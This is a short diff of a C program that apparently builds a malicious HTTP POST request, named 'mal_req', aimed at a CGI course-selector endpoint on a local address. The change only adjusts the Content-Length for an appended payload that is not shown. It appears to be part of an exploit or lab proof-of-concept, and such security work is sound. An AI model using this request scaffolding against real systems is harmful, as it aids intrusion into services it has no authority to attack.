@@ -192,7 +192,7 @@ int32_t main() {
     const char mal_req[] = "POST /cgi-bin/course_selector? HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
-        "Content-Length: 341\r\n"
+        "Content-Length: 351\r\n"
         "Connection: close\r\n"
         "\r\n"
         PAYLOAD;
